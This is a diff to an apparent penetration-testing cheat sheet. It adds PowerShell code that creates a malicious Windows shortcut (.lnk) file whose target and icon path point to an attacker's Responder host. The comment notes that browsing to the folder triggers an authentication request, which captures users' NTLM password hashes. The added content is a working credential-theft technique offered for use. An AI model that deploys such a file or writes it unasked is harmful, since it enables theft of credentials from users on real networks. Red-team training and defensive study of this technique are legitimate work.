@@ -41,8 +41,17 @@ responder -I eth0 -v
 ```
 
 ### Responder linkifle
+
+#### In Powershell, use each command to create a linkfile for Responder
 ```bash
-https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
+$lnk.TargetPath = "\\<ResponderIP>\@threat.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
 ```
 ## Nmap
 #### Scan for Version, OS-type and all open ports to a file
